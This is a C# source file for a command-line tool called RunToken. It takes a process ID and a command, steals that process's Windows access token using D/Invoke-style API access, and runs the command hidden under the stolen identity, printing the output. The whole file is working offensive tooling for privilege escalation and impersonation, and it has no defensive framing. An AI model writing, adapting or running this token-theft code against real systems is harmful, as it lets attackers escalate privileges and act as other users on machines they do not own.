using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Wrapper;

namespace RunToken
{
    internal class Program
    {
        public static string GetRunningExeName()
        {
            string processName = Process.GetCurrentProcess().MainModule.FileName;
            string exeName = System.IO.Path.GetFileName(processName);
            return exeName;
        }

        static void Main(string[] args)
        {
            APIWrapper.Config.PreferedAccessType = WinAPI.Wrapper.APIAccessType.DInvoke;

            string cmd = null;
            int? processId = null;
            ProcessCreationResult procResult = null;

            try
            {
                if (args.Length != 2)
                {
                    Console.WriteLine($"Usage: {GetRunningExeName()} processId cmd");
                    return;
                }
                else
                {
                    if (!int.TryParse(args[0], out var pId))
                        throw new ArgumentException("Process is not valid!");
                    cmd = args[1];
                    processId = pId;
                }


                Console.WriteLine($"[?] WinAPIAccess = {APIWrapper.Config.PreferedAccessType}");

                Console.WriteLine($"[>] Stealing Token from process {processId}...");
                IntPtr hToken = APIWrapper.StealToken(processId.Value);
                Console.WriteLine($"[?] TokenHandle = {hToken}");

                var creationParms = new ProcessCreationParameters()
                {
                    Command = cmd,
                    Token = hToken,
                    RedirectOutput = true,
                    CreateNoWindow = true,
                };

                Console.WriteLine($"[>] Executing {cmd}...");
                procResult = APIWrapper.CreateProcess(creationParms);

                Console.WriteLine($"[?] ProcessId = {procResult.ProcessId}");
                Console.WriteLine($"[?] ProcessHandle = {procResult.ProcessHandle}");
                Console.WriteLine($"[?] PipeHandle = {procResult.OutPipeHandle}");

                if (procResult.ProcessId != 0 && creationParms.RedirectOutput)
                {
                    var process = Process.GetProcessById(procResult.ProcessId);
                    Console.WriteLine("[+] Result :");
                    APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output => Console.Write(output));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Oooops something went wrong....");
                Console.WriteLine(ex.ToString());
            }
            finally
            {
                if (procResult != null)
                {
                    APIWrapper.CloseHandle(procResult.ProcessHandle);
                    APIWrapper.CloseHandle(procResult.ThreadHandle);
                    APIWrapper.CloseHandle(procResult.OutPipeHandle);
                    APIWrapper.KillProcess(procResult.ProcessId);
                }
            }
        }
    }
}
